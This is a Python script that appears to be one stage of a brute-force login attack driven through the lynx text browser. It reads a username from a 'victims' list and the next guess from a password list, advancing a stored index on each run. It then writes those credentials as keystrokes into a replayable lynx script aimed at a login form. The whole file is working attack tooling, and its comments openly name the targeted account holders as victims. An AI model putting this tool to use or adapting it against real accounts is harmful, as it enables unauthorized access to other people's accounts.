# it will read 'sample.txt' that was created with 'script_log'
# of lynx
# assumption: user put flags <start username> usrname <end username>
# <start password> password <end password>
# method: read sample.txt as it is till start username
# write username of next_victim_index 
# skip lines to <end username>
# read sample.txt as it is till start of password <start password>
# write password from sub_password_list.txt
# skip lines till <end password>
# write rest of the stuff as it is

#-------------username
# victim_index_handle
vic_index_handle=open("next_victim_index.txt",'r')
victim_index=int(((vic_index_handle.readline()).split('\n'))[0])
# victim_index=int(((vic_index_handle.readline()).split())[0])
vic_index_handle.close()
#------------------
name_handle=open("victims_list.txt",'r')
# spliting to remove the next line char
raw_userName=(((name_handle.readlines()))[victim_index])
userName=raw_userName.split('\n')[0]
name_handle.close()
#--------------
# nextpass_index_handle
npass_index_handle=open("next_password_index.txt",'r')
npass_index=int(((npass_index_handle.readline()).split('\n'))[0])
npass_index_handle.close()

#--------------
npass_index_handle=open("next_password_index.txt",'w')
npass_index_handle.write(str(npass_index+1))
npass_index_handle.close()

#--------------
password_handle=open("sub_password_list.txt",'r')
# spliting to remove the next line char
raw_password=(((password_handle.readlines()))[npass_index])
password=raw_password.split('\n')[0]
npass_index_handle.close()
password_handle.close()
#---------------------
# print(userName)
# print(password)
#****************************
# Above stuff just read 'username' and 'password'
#---------------------------
# it will insert custom username and password
# in accordance with lynx
def typeKeys(x):
	for char in x:
		if char == " ":
			char="<space>"
		ofileHandle.write("key "+ char+"\n")
#---------------------------
ifileHandle=open("sample.txt",'r')
ofileHandle=open("generated_script.txt",'w')
lineOfSample=ifileHandle.readline()
#-------------
# initializing the flags to False
start_username_detected=False
end_username_detected=False
start_password_detected=False
end_password_detected=False
#-------------
while lineOfSample != '':
	# something is left to read
	if lineOfSample == "<start username>\n":
		# print("username is detected")
		start_username_detected=True
		lineOfSample=ifileHandle.readline()
		while lineOfSample != "<end username>\n" and lineOfSample != '':
			# print("still running username")
			# just keep on incrementing the lines
			lineOfSample=ifileHandle.readline()
			if lineOfSample == "<end username>\n":
				end_username_detected=True
		typeKeys(userName)

		lineOfSample=ifileHandle.readline()
	elif lineOfSample == "<start password>\n":
		start_password_detected=True
		# print("password flag is detected")
		# password token is detected
		lineOfSample=ifileHandle.readline()
		while lineOfSample != "<end password>\n" and lineOfSample != '':
			# print("still running password")
			# just keep on incrementing the lines
			lineOfSample=ifileHandle.readline()
			if lineOfSample == "<end password>\n":
				end_password_detected=True
		typeKeys(password)
		lineOfSample=ifileHandle.readline()
	else:
		ofileHandle.write(lineOfSample)
		lineOfSample=ifileHandle.readline()
if start_password_detected and end_password_detected and start_username_detected and end_username_detected:
	print("file is generated successfully")
else:
	print("your flags are faulty, please correct them and try again")
